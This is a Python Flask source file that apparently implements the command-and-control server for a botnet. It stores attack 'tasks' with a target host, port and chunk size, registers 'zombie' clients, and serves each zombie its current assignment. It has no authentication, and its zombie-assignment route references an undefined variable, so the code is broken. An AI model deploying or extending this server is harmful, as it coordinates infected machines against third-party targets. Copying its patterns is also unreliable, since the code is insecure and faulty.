import os
from random import randint
import json
import time
import datetime

import requests
from flask import Flask, request, jsonify, session
from flask_cors import CORS, cross_origin
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
CORS(app)

if os.path.exists(os.path.join(os.getcwd(), "config.py")):
    app.config.from_pyfile(os.path.join(os.getcwd(), 'config.py'))
else:
    app.config.from_pyfile(os.path.join(os.getcwd(), 'config.env.py'))

db = SQLAlchemy(app)

# Disable SSL certificate verification warning
requests.packages.urllib3.disable_warnings()

# Disable SQLAlchemy modification tracking
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False


class Task(db.Model):
    __tablename__ = 'tasks'

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    target = db.Column(db.String)
    port = db.Column(db.Integer)
    chunksize = db.Column(db.Integer)
    active = db.Column(db.Integer)

    def __init__(self, id, name, target, port, chunksize, active):
        self.id = id
        self.name = name
        self.target = target
        self.port = port
        self.chunksize = chunksize
        self.active = active


class Client(db.Model):
    __tablename__ = 'clients'

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    task_id = db.Column(db.Integer)
    active = db.Column(db.Integer)
    last_online = db.Column(db.DateTime)

    def __init__(self, id, name, task_id, active, last_online):
        self.id = id
        self.name = name
        self.task_id = task_id
        self.active = active
        self.last_online = last_online


@app.route('/', methods=['GET'])
def test():
    return "dick..."


@app.route('/clients', methods=['GET', 'PUT'])
def all_clients():
    """
    :GET: returns all clients and their respective data
    :PUT: creates a client object, adds it to the database, and returns it
    """
    if request.method == 'GET':
        return parse_client_as_json(Client.query.all())
    elif request.method == 'PUT':
        name = request.args.get('name')
        task_id = request.args.get('task_id')
        if request.args.get('active'):
            active = request.args.get('active')
        else:
            active = 1

        # Create uuid
        id = randint(0, 999999999)
        while not is_client_key_unique(id):
            id = randint(0, 999999999)

        # Create last_online date
        last_online = time.strftime('%Y-%m-%d %H:%M:%S')

        # Add client to database
        new_client = Client(id=id,
                            name=name,
                            task_id=task_id,
                            active=active,
                            last_online=last_online)
        db.session.add(new_client)
        db.session.flush()
        db.session.commit()
        return jsonify(id), 201


@app.route('/tasks', methods=['GET', 'PUT'])
def all_tasks():
    """
    :GET: returns all tasks and their respective data
    :PUT: creates a task
    """
    if request.method == 'GET':
        return parse_task_as_json(Task.query.all()), 200
    elif request.method == 'PUT':
        # Get Parameters
        name = request.args.get('name')
        target = request.args.get('target')
        port = request.args.get('port')
        chunksize = request.args.get('chunksize')
        active = request.args.get('active')

        # Create uuid
        id = randint(0, 999999999)
        while not is_task_key_unique(id):
            id = randint(0, 999999999)

        # Add New Task
        new_task = Task(id=id,
                        name=name,
                        target=target,
                        port=port,
                        chunksize=chunksize,
                        active=active)
        db.session.add(new_task)
        db.session.flush()
        db.session.commit()
        return jsonify(return_task_json(new_task)), 201


@app.route('/tasks/<uid>', methods=['GET', 'PUT', 'DELETE'])
def singular_task(uid):
    """
    :param uid: unique ID of a task
    :GET: gets data for task identified by UID
    :PUT: modifies data for task identified by UID
    :DELETE: deletes task identified by UID
    """
    if request.method == 'GET':
        return parse_task_as_json(Task.query.filter_by(id=uid).all()), 200
    elif request.method == 'PUT':
        # Get Data for the matching task
        task = Task.query.filter_by(id=uid).first()
        # Determine what data is in the PUT method, fill in the blanks
        if request.args.get('name'):
            task.name = request.args.get('name')
        if request.args.get('target'):
            task.target = request.args.get('target')
        if request.args.get('port'):
            task.port = request.args.get('port')
        if request.args.get('chunksize'):
            task.chunksize = request.args.get('chunksize')
        if request.args.get('active'):
            task.active = request.args.get('active')

        # Perform update
        db.session.flush()
        db.session.commit()
        return jsonify(return_task_json(task)), 201
    elif request.method == 'DELETE':
        Task.query.filter_by(id=uid).delete()
        db.session.flush()
        db.session.commit()
        return "Success", 200


@app.route('/clients/<uid>', methods=['GET', 'PUT', 'DELETE'])
def singular_client(uid):
    """
    :param uid: unique ID for client
    :GET: returns data for client identified by UID
    :PUT: modifies specified data for client identified by UID
    :DELETE: deletes client specified by UID
    """
    if request.method == 'GET':
        client = Client.query.filter_by(id=uid).first()
        if client:
            return jsonify(return_client_json(client)), 200
        else:
            return "Invalid Client", 404
    elif request.method == 'PUT':
        # Get data for referenced client
        client = Client.query.filter_by(id=uid).first()

        # Determine what is being changed
        if request.args.get('name'):
            client.name = request.args.get('name')
        if request.args.get('task_id'):
            client.task_id = request.args.get('task_id')
        if request.args.get('active'):
            client.active = request.args.get('active')
        if request.args.get('last_online'):
            client.last_online = request.args.get('last_online')

        # Perform update
        db.session.flush()
        db.session.commit()
        return jsonify(return_client_json(client)), 201
    elif request.method == 'DELETE':
        Client.query.filter_by(id=uid).delete()
        db.session.flush()
        db.session.commit()
        return "Success", 200


@app.route('/clients/<uid>/toggle', methods=['PUT'])
def toggle_active(uid):
    """
    Toggles the "active" element of the client specified by UID
    :param uid: identifier for client to toggle the activity of
    :return: client object
    """
    client = Client.query.filter_by(id=uid).first()

    if not client.active:
        client.active = 1
    else:
        client.active = 0

    db.session.flush()
    db.session.commit()
    return jsonify(return_client_json(client)), 201


@app.route('/tasks/<uid>/toggle', methods=['PUT'])
def task_toggle_active(uid):
    """
    Toggles the "active" element of the task specified by UID
    :param uid: identifier for task to toggle activity of
    :return: task object
    """
    task = Task.query.filter_by(id=uid).first()

    if not task.active:
        task.active = 1
    else:
        task.active = 0

    db.session.flush()
    db.session.commit()
    return jsonify(return_task_json(task)), 201


@app.route('/<zombie_uid>', methods=['GET'])
def get_zombie_assignment(zombie_uid):
    client = Client.query.filter_by(id=uid).first()
    if client:
        ts = time.time()
        last_online = datetime.datetime.fromtimestamp(ts).strftime('%m/%d/%Y %I:%M:%S %p')
        client.last_online = last_online
        db.session.flush()
        db.session.commit()
        return jsonify(return_client_json(client)), 200
    else:
        return "Invalid Client", 404


def parse_task_as_json(tasks: list):
    """
    Accepts a list of tasks and then translates it to a jsonified list of
    task objects
    :param tasks: tasks to transform
    :return: list of task objects
    """
    json = []
    for task in tasks:
        json.append(return_task_json(task))
    return jsonify(json)


def return_task_json(task):
    """
    Accepts a task and turns it into a json object
    :param task: task
    :return: task object
    """
    return {
        'id': task.id,
        'name': task.name,
        'target': task.target,
        'port': task.port,
        'chunksize': task.chunksize,
        'active': task.active,
    }


def parse_client_as_json(clients: list):
    """
    Accepts a list of clients and then translates it to a jsonified list of
    client objects
    :param clients: clients to transform
    :return: list of clients objects
    """
    json = []
    for client in clients:
        json.append(return_client_json(client))
    return jsonify(json)


def return_client_json(client):
    """
    Accepts a client and turns it into a json object
    :param client: task
    :return: client object
    """
    return {
        'id': client.id,
        'name': client.name,
        'task_id': client.task_id,
        'active': client.active,
        'last_online': client.last_online,
    }


def is_task_key_unique(key):
    """
    Checks to see if a key exists in the task table
    :param key: key to check
    :return: true if key is unique, false otherwise
    """
    if Task.query.filter_by(id=key).all():
        return False
    return True


def is_client_key_unique(key):
    """
    Checks to see if a key exists in the client table
    :param key: key to check existence of
    :return: true if key is unique, false otherwise
    """
    if Client.query.filter_by(id=key).all():
        return False
    return True
